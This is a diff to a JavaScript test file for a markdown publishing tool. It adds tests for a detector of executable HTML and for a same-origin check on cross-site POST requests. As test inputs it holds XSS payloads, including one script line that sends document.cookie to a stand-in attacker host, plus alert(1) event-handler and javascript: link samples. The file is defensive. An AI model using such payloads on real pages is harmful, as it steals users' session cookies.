@@ -21,7 +21,9 @@ import {
   MAX_CHAIN,
   unfencedTags,
   checkSources,
+  dangerousHtml,
 } from './src/pipeline.js';
+import { isSameOrigin } from './src/index.js';
 
 let passed = 0;
 function test(name, fn) {
@@ -339,6 +341,88 @@ test('escapes a single quote so the YAML stays valid', () => {
   );
   const md = buildMarkdown(d, { category: 'ai', publishDate: '2026-11-07' });
   assert.match(md, /title: 'Ollama''s quantisation, explained simply'/);
+});
+
+console.log('\nHTML that would run on the published page');
+
+// Markdown does not escape raw HTML — it hands it to the page. These are the
+// cases that separate "showing an example" from "executing it".
+test('an unfenced script tag is refused', () => {
+  const r = dangerousHtml('Intro.\n\n<script>fetch("https://evil.test?c="+document.cookie)</script>\n');
+  assert.deepEqual(r, ['<script>']);
+});
+
+test('a fenced script tag is fine — that is the whole point of fencing', () => {
+  const r = dangerousHtml('Here is the markup:\n\n```html\n<script>alert(1)</script>\n```\n');
+  assert.deepEqual(r, []);
+});
+
+test('an iframe is refused too', () => {
+  assert.deepEqual(dangerousHtml('text <iframe src="https://evil.test"></iframe>'), ['<iframe>']);
+});
+
+test('an inline event handler is caught even on a harmless tag', () => {
+  const r = dangerousHtml('<img src=x onerror=alert(1)>');
+  assert.ok(r.includes('an inline event handler'), JSON.stringify(r));
+});
+
+test('a javascript: link is caught', () => {
+  const r = dangerousHtml('<a href="javascript:alert(1)">click</a>');
+  assert.ok(r.includes('a javascript: URL'), JSON.stringify(r));
+});
+
+test('ordinary prose is not blocked by the handler pattern', () => {
+  // "only=" starts with "on" and would match a lazier regex; so would a
+  // sentence about javascript: with no tag around it.
+  const r = dangerousHtml('Set only=true in the config. The javascript: scheme is worth knowing.');
+  assert.deepEqual(r, []);
+});
+
+test('a real published article passes', () => {
+  const r = dangerousHtml(
+    '## Heading\n\nSome text with `inline code` and a [link](https://example.com).\n\n```bash\ncurl -s https://example.com\n```\n',
+  );
+  assert.deepEqual(r, []);
+});
+
+test('a slug that normalises to nothing is refused, not committed as .md', () => {
+  assert.throws(
+    () => validateDraft(JSON.stringify({ ...good, slug: '!!!' }), opts),
+    /nothing usable/,
+  );
+});
+
+console.log('\nCross-site requests');
+
+const req = (headers) => new Request('https://write.qivy.in/draft/1/publish', { method: 'POST', headers });
+const here = new URL('https://write.qivy.in/draft/1/publish');
+
+test('our own form is allowed', () => {
+  assert.equal(isSameOrigin(req({ Origin: 'https://write.qivy.in' }), here), true);
+});
+
+test('another site posting with the Access cookie is refused', () => {
+  assert.equal(isSameOrigin(req({ Origin: 'https://evil.test' }), here), false);
+});
+
+test('a lookalike origin is refused', () => {
+  assert.equal(isSameOrigin(req({ Origin: 'https://write.qivy.in.evil.test' }), here), false);
+});
+
+test('the same host on another scheme is refused', () => {
+  assert.equal(isSameOrigin(req({ Origin: 'http://write.qivy.in' }), here), false);
+});
+
+test('no Origin and no Referer is refused, not waved through', () => {
+  assert.equal(isSameOrigin(req({}), here), false);
+});
+
+test('an unparseable Origin is refused', () => {
+  assert.equal(isSameOrigin(req({ Origin: 'not a url' }), here), false);
+});
+
+test('Referer is accepted as the fallback it is', () => {
+  assert.equal(isSameOrigin(req({ Referer: 'https://write.qivy.in/draft/1' }), here), true);
 });
 
 console.log(`\n${passed} checks passed${process.exitCode ? ' — with failures above' : ''}.\n`);
